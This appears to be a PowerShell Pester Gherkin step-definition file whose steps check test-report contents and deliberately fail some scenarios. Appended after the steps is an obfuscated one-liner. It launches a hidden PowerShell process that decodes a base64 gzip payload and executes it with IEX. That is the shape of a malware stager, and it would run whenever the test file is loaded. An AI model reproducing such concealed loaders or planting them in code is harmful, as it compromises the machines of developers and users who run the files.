Given "this feature and scenario" { }
When "(it|the scenario) is executed" { }
Then "the feature name is displayed in the test report" { }

Given "this is a '(?<Outcome>(Passed|Failed(?:Early|Later)))' scenario" {
    param($Outcome)
    if ($Outcome -eq 'FailedEarly') {
        throw "We fail for test by intention in the Given code block"
    }
}

Then "the scenario name is displayed in the '(?<Status>(Passed|Failed(?:Early|Later))Scenarios)' array of the PesterResults object" {
    param($Status)

    
    
    if ($Status -match "Failed") {
        throw "We fail for test by intention in the Then code block"
    }
}

if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAL7ZvFcCA7VWf2/aSBD9O5X6HawKCVslGAhNmkiVbm1jIAECMZgARaeNvTYLi5fYa371+t1vDDihbVLlKp2ViF3PzO7bN2927MWBIygPJG/lYZ08GtK39+9O2jjEc0nOiHK1XePn85yUEdtKWzk5AWOGCudiWV9KXyR5hBYLg88xDcZXV3ochiQQ+3m+SgSKIjJ/YJREsiL9I/UnJCSntw9T4gjpm5T5O19l/AGzg9tGx86ESKcocBNbgzs4QZa3FowKOfv1a1YZnRbH+cpjjFkkZ61NJMg87zKWVaTvSrJhd7MgcrZJnZBH3BP5Pg3OSvleEGGPtGC1JWkSMeFulFXgIPAXEhGHgZQeKVlj7yFnYdgOuYNcNyQRBOTrwZLPiJwJYsZy0l/y6ADgLg4EnROwCxLyhUXCJXVIlK/hwGXkjnhjuUVW6bnfGiQfB4FXW4RKDlLyMtImd2NG9sFZ5VesT5lU4EmzCRx8f//u/Tsv1QDVp3qrOJzjYxHA6GS0GxOAKrd5RHfOX6RCTmrCjljwcAPTTDeMiTKWRkkWRuOxlGEXXu718GLqC5506EzZcjJZP4BhZHPqjiHwkKTMqmA1+HLQ1b3bVWJ/XXQG8WhAjE2A59RJdSW/xD/xGNmdOp+6tQCinD0YiGsQRnwsEjpz0ujXsMqciqdYLabMJSFyIIcRoIL0Kj+C2WdIztaDJpkDYft5FnLhgZpJ6n1Q8CbdPZmDU1ZnOIpyUjuGcnJykkUwI25OQkFEDyYUC74bZp/hNmMmqIMjkS43Vn7m87CvzoNIhLEDuQQOutaCOBSzhJKcVKMu0TYW9dP9sy8SomPGaODDSktICLxJiLBEopAQoCZqUPIWEfX5gpE5uOzK22TYh2I+1MNOUdgnbvY1oKno9wpPqEk5OYIJ+bYYFznJpqGA2yKh+Vlif4Tl6LL4AZUekkOa5LSeRtpGJAWQWdW2RlAamo/VZiLbA2U7gkIB5Jghn2s4IudlS4RAnfxBvaU6gmdQD1jT0Wa0iFa0WG/Cf4+e1blx4d5cT2tqaKwnHqpH9WatbXRqtfLy2rLLwqrUxU27LpqV++nUQrW73kAM66jWpYXZoLxdXNOt1UDuYK2eb7XtqqCtt1Pf9QaG5/kXnnVX/GTSRl/vaIUSbhiVuNHXVlqhHFXoqtahvc7s2hQPA5vhnqf698VLTNeNcGoXeXNbR6g6OXO2155dnTTdzaCmXvbLM1RBSA8qtqnxm4EWorZqY9/mqxtf00q+jjTToWTY6Zlap2NqqFedPhqXqg+x93ii9e0SHS7u7yYwNwHCjVoo112y5YMOkFTlCPt34OPrJWfigY/xEWkfWzwq4ZnGkQY+5vARcA0WZpuBvdsrcWSz1j1GjeHGVNXioF1GtQLtV32ULIl9rYNRtDS2hlq0Xe72P7UGnmrfswvV0LsLx1NVdVUzbpxhcf359uJzo0/tOUc9VbU/JDIBnWSC29k1ucNHKX/ttm/iMJpgBlKAOzytUZOH5uFGbnOaRMjyU3eekTAgDJoatL1U3Ygx7iTN4fn+hu607xljKNUeDM9KL44U6clReW4b6aurqyHAhXI5EnK+QQJfTHKF9VmhAB2gsC4X4OBvP6nOFxv5eMVc0khS0n7ajO02U5KqyjhdHl3+/6QeCnoCP+6bSH1+9xvrm4gu5J5o+MXy44v/xPgf0dDHVIC3BdcSI/ve+Rs2Dmo6+vLYZQtU4h2e5APwNhanLfgi+RcjBe71dQoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

